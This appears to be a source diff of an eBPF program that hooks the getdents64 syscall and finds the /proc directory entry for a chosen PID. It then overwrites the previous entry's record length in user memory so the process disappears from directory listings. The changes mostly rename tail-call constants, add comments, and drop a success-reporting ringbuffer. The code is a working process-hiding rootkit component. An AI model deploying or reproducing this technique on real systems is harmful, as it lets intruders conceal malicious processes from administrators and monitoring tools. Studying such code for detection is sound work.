@@ -4,30 +4,13 @@
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
-//#include "common.h"
 
-// These are used by a number of
-// different programs to sync eBPF Tail Call
-// login between user space and kernel
-#define PROG_01 1 // getdents_exit
-#define PROG_02 2 // getdents_patch
+// These define our tail calls, allowing one function to drop to another!
+#define TAIL_EXIT 1 // getdents_exit
+#define TAIL_PATCH 2 // getdents_patch
+
 #define pid_length 10
-
-// Used when replacing text
-#define FILENAME_LEN_MAX 50
-#define TEXT_LEN_MAX 20
-
 #define max_pid_len  10
-
-
-// Simple message structure to get events from eBPF Programs
-// in the kernel to user spcae
-#define TASK_COMM_LEN 16
-struct event {
-    int pid;
-    char comm[TASK_COMM_LEN];
-    bool success;
-};
 
 char __license[] SEC("license") = "GPL";
 
@@ -41,14 +24,8 @@ pid_map SEC(".maps");
 
 struct pid_watch {
   size_t pid_string_len;
-  char pid_string[max_pid_len];
+  __u8 pid_string[max_pid_len]; // This should be a char but code generation between here and Go..
 };
-
-// Ringbuffer Map to pass messages from kernel to user
-struct {
-    __uint(type, BPF_MAP_TYPE_RINGBUF);
-    __uint(max_entries, 256 * 1024);
-} rb SEC(".maps");
 
 // Map to fold the dents buffer addresses
 struct {
@@ -89,16 +66,6 @@ const volatile int target_ppid = 0;
 // These store the string represenation
 // of the PID to hide. This becomes the name
 // of the folder in /proc/
-//const volatile int pid_to_hide_len = 0;
-//const volatile char pid_to_hide[max_pid_len];
-
-// struct linux_dirent64 {
-//     u64        d_ino;    /* 64-bit inode number */
-//     u64        d_off;    /* 64-bit offset to next structure */
-//     unsigned short d_reclen; /* Size of this dirent */
-//     unsigned char  d_type;   /* File type */
-//     char           d_name[]; /* Filename (null-terminated) */ }; 
-// int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 SEC("tp/syscalls/sys_enter_getdents64")
 int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
 {
@@ -112,9 +79,6 @@ int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
             return 0;
         }
     }
-    //int pid = pid_tgid >> 32;
-    //unsigned int fd = ctx->args[0];
-    //unsigned int buff_count = ctx->args[2];
 
     // Store params in map for exit function
     struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
@@ -146,7 +110,6 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
     // patching
     long unsigned int buff_addr = *pbuff_addr;
     struct linux_dirent64 *dirp = 0;
-    //int pid = pid_tgid >> 32;
     short unsigned int d_reclen = 0;
     char filename[max_pid_len];
 
@@ -156,7 +119,8 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
         bpos = *pBPOS;
     }
 
-    //char *target_string;
+    // This is slightly gross, but we have a map that we will only ever use the same key for
+    // key 0 will always point to our string, which is the pid we watch for.
     __u32 key = 0;
     struct pid_watch *pid_to_watch;
     pid_to_watch = bpf_map_lookup_elem(&pid_map, &key);
@@ -177,7 +141,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
 
         for (j = 0; j < sizeof(filename); j++) {
             if (filename[j] != pid_to_watch->pid_string[j]) {
-                break;
+                break; // filename contains characters not in our pid
             }
             if ( j == pid_to_watch->pid_string_len) {
                 break;
@@ -185,7 +149,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
         }
         
         if (j == pid_to_watch->pid_string_len) {
-            bpf_printk("[PID_HIDE] filename -> %s, looking for-> %s", filename, pid_to_watch->pid_string);
+            bpf_printk("[found] filename -> %s, looking for-> %s", filename, pid_to_watch->pid_string);
 
             // ***********
             // We've found the folder!!!
@@ -193,7 +157,8 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
             // ***********
             bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
             bpf_map_delete_elem(&map_buffs, &pid_tgid);
-            bpf_tail_call(ctx, &map_prog_array, PROG_02);
+            // Jump using our tail call to the patch function
+            bpf_tail_call(ctx, &map_prog_array, TAIL_PATCH);
         }
         bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
         bpos += d_reclen;
@@ -203,7 +168,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
     // jump back the start of this function and keep looking
     if (bpos < total_bytes_read) {
         bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
-        bpf_tail_call(ctx, &map_prog_array, PROG_01);
+        bpf_tail_call(ctx, &map_prog_array, TAIL_EXIT);
     }
     bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
     bpf_map_delete_elem(&map_buffs, &pid_tgid);
@@ -244,18 +209,7 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
 
     // Attempt to overwrite
     short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
-    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
-
-    // Send an event
-    struct event *e;
-    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
-    if (e) {
-        e->success = (ret == 0);
-        e->pid = (pid_tgid >> 32);
-        bpf_get_current_comm(&e->comm, sizeof(e->comm));
-        bpf_ringbuf_submit(e, 0);
-    }
-
+    bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
 
     bpf_map_delete_elem(&map_to_patch, &pid_tgid);
     return 0;
